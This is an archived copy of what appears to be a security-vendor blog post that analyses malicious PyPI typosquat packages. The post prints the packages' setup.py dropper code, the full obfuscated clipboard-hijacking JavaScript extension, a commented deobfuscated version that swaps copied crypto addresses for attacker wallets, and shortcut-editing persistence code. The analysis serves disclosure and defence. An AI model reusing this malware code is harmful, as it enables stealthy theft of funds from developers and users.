<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.phylum.io/pypi-malware-replaces-crypto-addresses-in-developers-clipboard">Original</a>
    <h1>Malicious Python packages replace crypto addresses in developer clipboards</h1>
    
    <div id="readability-page-1" class="page"><article>
                      <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Less than a week after <a href="https://blog.phylum.io/phylum-discovers-dozens-more-pypi-packages-attempting-to-deliver-w4sp-stealer-in-ongoing-supply-chain-attack" target="_blank" rel="noopener noreferrer" data-token-index="1" data-reactroot=""><span>we identified dozens of typosquat packages targeting developers</span></a>, our automated risk platform has identified several more packages involved in a separate burgeoning campaign targeting developers and their cryptocurrency. The packages targeted in this campaign are <span><span>downloaded over 29</span></span><span><strong><span> million times each day </span>- </strong></span><span><strong>a significant potential blast radius for the attacker</strong></span>!</p>
<!--more-->
<p>The current (and expanding) list of packages in this ongoing campaign are as follows:</p>
<ul>
<li><code>baeutifulsoup4</code></li>
<li><code>beautifulsup4</code></li>
<li><code>cloorama</code></li>
<li><code>cryptograpyh</code></li>
<li><code>crpytography</code></li>
<li><code>djangoo</code></li>
<li><code>hello-world-exampl</code></li>
<li><code>hello-world-example</code></li>
<li><code>ipyhton</code></li>
<li><code>mail-validator</code></li>
<li><code>mariabd</code></li>
<li><code>mysql-connector-pyhton</code></li>
<li><code>notebok</code></li>
<li><code>pillwo</code></li>
<li><code>pyautogiu</code></li>
<li><code>pygaem</code></li>
<li><code>pytorhc</code></li>
<li><code>python-dateuti</code></li>
<li><code>python-flask</code></li>
<li><code>python3-flask</code></li>
<li><code>pyyalm</code></li>
<li><code>rqeuests</code></li>
<li><code>slenium</code></li>
<li><code>sqlachemy</code></li>
<li><code>sqlalcemy</code></li>
<li><code>tkniter</code></li>
<li><code>urlllib</code></li>
</ul>
<p>After installation, a malicious Javascript file is dropped to the system and executed in the background of any web browsing session. When a developer copies a cryptocurrency address, the address is replaced in the clipboard with the attacker&#39;s address.</p>
<p>At the time of this writing (around an hour after the first malicious package was published), these packages have been downloaded over one hundred times. While we have reported each of these packages (and will continue to do so), we expect both the number of downloads and overall package count to climb in the coming hours.</p>
<h2>Dropping Obfuscated JS from Python</h2>
<p>The malicious payload for each of these packages exists in the <code>setup.py</code>. The malware authors begin by getting a list of “interesting” paths:</p>
<pre><code>appDataPath = os.getenv(&#39;APPDATA&#39;)
desktopPath = os.path.expanduser(&#39;~\Desktop&#39;)
paths = [
    appDataPath + &#39;\\Microsoft\\Windows\\Start Menu&#39;,
    appDataPath + &#39;\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar&#39;,
    desktopPath
]</code></pre>
<p>If the user is an administrator, they add an additional path to the list:</p>
<pre><code>if ctypes.windll.shell32.IsUserAnAdmin():
    paths.append(&#39;C:\\ProgramData\\Microsoft\\Windows\\Start Menu&#39;)</code></pre>
<p>They then create an <code>Extension</code> directory, if one didn’t already exist:</p>
<pre><code>if not os.path.exists(appDataPath + &#39;\\Extension&#39;):
    os.makedirs(appDataPath + &#39;\\Extension&#39;)</code></pre>
<p>Finally, the attackers write <em>obfuscated Javascript</em> to the <code>$APPDATA\\Extension</code> folder:</p>
<pre><code>with open(appDataPath + &#39;\\Extension\\background.js&#39;, &#39;w+&#39;) as extensionFile:
    extensionFile.write(&#39;&#39;&#39;var _0x327ff6=_0x11d4;(function(_0x314c14,_0x4da2d4){var _0x4d9550=_0x11d4,_0x41c8ae=_0x314c14();while(!![]){try{var _0x291238=parseInt(_0x4d9550(0x83))/0x1+parseInt(_0x4d9550(0x87))/0x2*(-parseInt(_0x4d9550(0x7c))/0x3)+-parseInt(_0x4d9550(0x81))/0x4*(-parseInt(_0x4d9550(0x8b))/0x5)+parseInt(_0x4d9550(0x7e))/0x6*(parseInt(_0x4d9550(0x75))/0x7)+-parseInt(_0x4d9550(0x89))/0x8+-parseInt(_0x4d9550(0x85))/0x9+parseInt(_0x4d9550(0x82))/0xa;if(_0x291238===_0x4da2d4)break;else _0x41c8ae[&#39;push&#39;](_0x41c8ae[&#39;shift&#39;]());}catch(_0x435e56){_0x41c8ae[&#39;push&#39;](_0x41c8ae[&#39;shift&#39;]());}}}(_0x7dfe,0x8e72d));let page=chrome[_0x327ff6(0x77)][_0x327ff6(0x76)]();function _0x11d4(_0x5d4133,_0x41221d){var _0x7dfebe=_0x7dfe();return _0x11d4=function(_0x11d4f7,_0x3282ea){_0x11d4f7=_0x11d4f7-0x75;var _0x34f11d=_0x7dfebe[_0x11d4f7];return _0x34f11d;},_0x11d4(_0x5d4133,_0x41221d);}var inputElement=document[_0x327ff6(0x88)](_0x327ff6(0x8a));document[&#39;body&#39;][_0x327ff6(0x86)](inputElement),inputElement[&#39;focus&#39;]();function check(){var _0xe8a3e=_0x327ff6;document[_0xe8a3e(0x79)](_0xe8a3e(0x7f));var _0x5eb90d=inputElement[_0xe8a3e(0x7a)];_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,&#39;0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9&#39;),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,&#39;TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx&#39;),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,&#39;bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v&#39;),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,_0xe8a3e(0x84)),inputElement[&#39;value&#39;]=_0x5eb90d,inputElement[_0xe8a3e(0x7d)](),document[&#39;execCommand&#39;](_0xe8a3e(0x7b)),inputElement[_0xe8a3e(0x7a)]=&#39;&#39;;}function _0x7dfe(){var _0x1c8730=[&#39;8bkbJpt&#39;,&#39;14903530AaRyNg&#39;,&#39;646317UWotJX&#39;,&#39;LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq&#39;,&#39;9448686izWZHq&#39;,&#39;appendChild&#39;,&#39;2hKfLTM&#39;,&#39;createElement&#39;,&#39;3544256zMWJYQ&#39;,&#39;textarea&#39;,&#39;10470IXKEdo&#39;,&#39;42UUKWJT&#39;,&#39;getBackgroundPage&#39;,&#39;extension&#39;,&#39;replace&#39;,&#39;execCommand&#39;,&#39;value&#39;,&#39;copy&#39;,&#39;1539693aOTNUd&#39;,&#39;select&#39;,&#39;448728VNjtMg&#39;,&#39;paste&#39;,&#39;bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv&#39;];_0x7dfe=function(){return _0x1c8730;};return _0x7dfe();}setInterval(check,0x3e8);&#39;&#39;&#39;)</code></pre>
<p>and write a <code>manifest.json</code> to the <code>$APPDATA\\Extension</code> folder, which requests the <code>clipboardWrite</code> and <code>clipboardRead</code> permissions:</p>
<pre><code>
with open(appDataPath + &#39;\\Extension\\manifest.json&#39;, &#39;w+&#39;) as manifestFile:
        manifestFile.write(&#39;{&#34;name&#34;: &#34;Windows&#34;,&#34;background&#34;: {&#34;scripts&#34;: [&#34;background.js&#34;]},&#34;version&#34;: &#34;1&#34;,&#34;manifest_version&#34;: 2,&#34;permissions&#34;: [&#34;clipboardWrite&#34;, &#34;clipboardRead&#34;]}&#39;)
</code></pre>
<h2>Deobfuscating Javascript Bits</h2>
<p>In an attempt to hide what the malicious payload is doing, the attacker obfuscated the Javascript using a common obfuscator.</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/obfuscated-js.png?width=1350&amp;height=803&amp;name=obfuscated-js.png" alt="obfuscated-js" width="1350" height="803" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/obfuscated-js.png?width=675&amp;height=402&amp;name=obfuscated-js.png 675w, https://blog.phylum.io/hs-fs/hubfs/obfuscated-js.png?width=1350&amp;height=803&amp;name=obfuscated-js.png 1350w, https://blog.phylum.io/hs-fs/hubfs/obfuscated-js.png?width=2025&amp;height=1205&amp;name=obfuscated-js.png 2025w, https://blog.phylum.io/hs-fs/hubfs/obfuscated-js.png?width=2700&amp;height=1606&amp;name=obfuscated-js.png 2700w, https://blog.phylum.io/hs-fs/hubfs/obfuscated-js.png?width=3375&amp;height=2008&amp;name=obfuscated-js.png 3375w, https://blog.phylum.io/hs-fs/hubfs/obfuscated-js.png?width=4050&amp;height=2409&amp;name=obfuscated-js.png 4050w" sizes="(max-width: 1350px) 100vw, 1350px"/></p>
<p>Although we can probably infer what this malicious package is doing based on the requested permissions in the <code>manifest.json</code>, lets deobfuscate it to be certain. Comments are added.</p>
<pre><code>/**
 * Returns the Window of the background page if the background script is running.
 * If the script is not running, null is returned.
 */
let page = chrome[&#39;extension&#39;][&#39;getBackgroundPage&#39;]();

// Create a new text area on the page 
var textareaElement = document.createElement(&#39;textarea&#39;);
document[&#39;body&#39;][&#39;appendChild&#39;](textareaElement);

// Then focus on it
textareaElement[&#39;focus&#39;]();

function lookforCryptoAddresses() {
    // The input element is on our newly defined element and we paste whatever is in the
    // clipboard to it.
    document[&#39;execCommand&#39;](&#39;paste&#39;);

    // We then get the value of what we just pasted in the text area.
    var inputValue = textareaElement[&#39;value&#39;];

    /** Look at the value, if it matches one of the regexes replace the crypto address **/
    // ETH addresses
    inputValue = inputValue.replace(/^(0x)[a-fA-F0-9]{40}$/, &#39;0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9&#39;),
    
		// TRX (TRON) address
		inputValue = inputValue.replace(/^T[A-Za-z1-9]{33}$/, &#39;TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx&#39;),
    
		// BNB Address
		inputValue = inputValue.replace(/^(bnb1)[0-9a-z]{38}$/, &#39;bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv&#39;),
    
		// BTC Address
		inputValue = inputValue.replace(/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/, &#39;bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v&#39;),
    
		// LTC Address
		inputValue = inputValue.replace(/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/, &#39;LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq&#39;),
    
    // Update the text area to the value we replaced above.
    textareaElement[&#39;value&#39;] = inputValue,

    // Select whatever is in the text area.
    textareaElement[&#39;select&#39;](),

    // Copy that to the clipboard, thereby overwriting the address the user copied.
    document[&#39;execCommand&#39;](&#39;copy&#39;),

    // Clear the text area.
    textareaElement[&#39;value&#39;] = &#39;&#39;;
}

// Monitor the clipboard every second.
setInterval(lookforCryptoAddresses, 1000);</code></pre>
<p>At a high-level, the attacker:</p>
<ul>
<li>Creates a <code>textarea</code> on the page</li>
<li>Pastes any clipboard contents to it</li>
<li>Uses a series of regular expressions to search for common cryptocurrency address formats</li>
<li>Replaces any identified addresses with the attacker controlled addresses in the previously created <code>textarea</code></li>
<li>Copies the <code>textarea</code> to the clipboard</li>
</ul>
<p>If at any point a compromised developer copies a wallet address, the malicious package will replace the address with an attacker controlled address. This surreptitious find/replace will cause the end user to inadvertently send their funds to the attacker.</p>
<h2>Attacker Controlled Wallets</h2>
<p>The current list of attacker controlled addresses is:</p>
<ul>
<li>ETH <code>0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9</code></li>
<li>BTC <code>bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v</code></li>
<li>BNB <code>bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv</code></li>
<li>LTC <code>LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq</code></li>
<li>TRX <code>TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx</code></li>
</ul>
<p>At the time of this writing, no funds have been transferred to the attackers.</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/btc-attacker-wallet.png?width=2000&amp;height=837&amp;name=btc-attacker-wallet.png" alt="btc-attacker-wallet" width="2000" height="837" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/btc-attacker-wallet.png?width=1000&amp;height=419&amp;name=btc-attacker-wallet.png 1000w, https://blog.phylum.io/hs-fs/hubfs/btc-attacker-wallet.png?width=2000&amp;height=837&amp;name=btc-attacker-wallet.png 2000w, https://blog.phylum.io/hs-fs/hubfs/btc-attacker-wallet.png?width=3000&amp;height=1256&amp;name=btc-attacker-wallet.png 3000w, https://blog.phylum.io/hs-fs/hubfs/btc-attacker-wallet.png?width=4000&amp;height=1674&amp;name=btc-attacker-wallet.png 4000w, https://blog.phylum.io/hs-fs/hubfs/btc-attacker-wallet.png?width=5000&amp;height=2093&amp;name=btc-attacker-wallet.png 5000w, https://blog.phylum.io/hs-fs/hubfs/btc-attacker-wallet.png?width=6000&amp;height=2511&amp;name=btc-attacker-wallet.png 6000w" sizes="(max-width: 2000px) 100vw, 2000px"/></p>
<h2>Getting Persistence</h2>
<p>The persistence mechanism is simplistic, but effective:</p>
<pre><code>for path in paths:
	for root_directory, sub_directories, files in os.walk(path):
		for file in files:
			if file.endswith(&#39;.lnk&#39;):
				try:
					shortcut = shell.CreateShortcut(root_directory + &#39;\\&#39; + file)
					executable_name = os.path.basename(shortcut.TargetPath)

					if executable_name in [&#39;chrome.exe&#39;, &#39;msedge.exe&#39;, &#39;launcher.exe&#39;, &#39;brave.exe&#39;]:
						shortcut.Arguments = &#39;--load-extension={appDataPath}\\Extension&#39;.format(appDataPath=appDataPath)
						shortcut.Save()
				except Exception as e:
					...</code></pre>
<p>The attackers first start by walking all paths in the <code>path</code> list they created above. If they identify any <code>LNK</code> files and the executable in the target is one of <code>chrome.exe</code>, <code>msedge.exe</code>, <code>launcher.exe</code> or <code>brave.exe</code> they add the following:</p>
<pre><code>--load-extension={appDataPath}\\Extension</code></pre>
<p>This ensures that the malicious payload is executed when one of these browsers is opened.</p>
<h2>Developers Are The Targets</h2>
<!-- Place this tag in your head or just before your close body tag. -->

<p>The unfortunate reality is developers are now direct targets of these supply chain attacks. Failing to protect developers is a failure of the technical organization as a whole. Because of this, we are actively working on an open source, freely available solution that sandboxes package installations. This offering is currently <a href="https://github.com/phylum-dev/cli">rolled into our CLI</a><!-- Place this tag where you want the button to render. --> <a href="https://github.com/phylum-dev/cli" data-icon="octicon-star" aria-label="Star phylum-dev/cli on GitHub">Star</a>, but the underlying <a href="https://github.com/phylum-dev/birdcage">sandboxing capability (called Birdcage)</a><!-- Place this tag where you want the button to render. --> <a href="https://github.com/phylum-dev/birdcage" data-icon="octicon-star" aria-label="Star buttons/github-buttons on GitHub">Star</a> is also available for integration into other open source projects.</p>
<p>Here we are installing a malicious NPM package that exfiltrates SSH keys:</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/npm_install.gif?width=800&amp;height=460&amp;name=npm_install.gif" alt="npm_install" width="800" height="460" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/npm_install.gif?width=400&amp;height=230&amp;name=npm_install.gif 400w, https://blog.phylum.io/hs-fs/hubfs/npm_install.gif?width=800&amp;height=460&amp;name=npm_install.gif 800w, https://blog.phylum.io/hs-fs/hubfs/npm_install.gif?width=1200&amp;height=690&amp;name=npm_install.gif 1200w, https://blog.phylum.io/hs-fs/hubfs/npm_install.gif?width=1600&amp;height=920&amp;name=npm_install.gif 1600w, https://blog.phylum.io/hs-fs/hubfs/npm_install.gif?width=2000&amp;height=1150&amp;name=npm_install.gif 2000w, https://blog.phylum.io/hs-fs/hubfs/npm_install.gif?width=2400&amp;height=1380&amp;name=npm_install.gif 2400w" sizes="(max-width: 800px) 100vw, 800px"/></p>
<p>And again using Birdcage; the SSH keys are never sent from the developer machine:</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/phylum_install.gif?width=800&amp;height=460&amp;name=phylum_install.gif" alt="phylum_install" width="800" height="460" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/phylum_install.gif?width=400&amp;height=230&amp;name=phylum_install.gif 400w, https://blog.phylum.io/hs-fs/hubfs/phylum_install.gif?width=800&amp;height=460&amp;name=phylum_install.gif 800w, https://blog.phylum.io/hs-fs/hubfs/phylum_install.gif?width=1200&amp;height=690&amp;name=phylum_install.gif 1200w, https://blog.phylum.io/hs-fs/hubfs/phylum_install.gif?width=1600&amp;height=920&amp;name=phylum_install.gif 1600w, https://blog.phylum.io/hs-fs/hubfs/phylum_install.gif?width=2000&amp;height=1150&amp;name=phylum_install.gif 2000w, https://blog.phylum.io/hs-fs/hubfs/phylum_install.gif?width=2400&amp;height=1380&amp;name=phylum_install.gif 2400w" sizes="(max-width: 800px) 100vw, 800px"/></p>
<p>We are still actively working to improve the sandbox, but welcome contributions and ideas from the community! Join us on our <a href="https://join.slack.com/t/phylumio/shared_invite/zt-1cbgl6qjp-C_mkSFibEA9DyDxjYHbttQ" rel="noopener" target="_blank">community Slack</a> to discuss all things security, supply chain risks and upcoming CTFs.</p>
<pre><code></code></pre></span>
                      </p>
                    </article></div>
  </body>
</html>
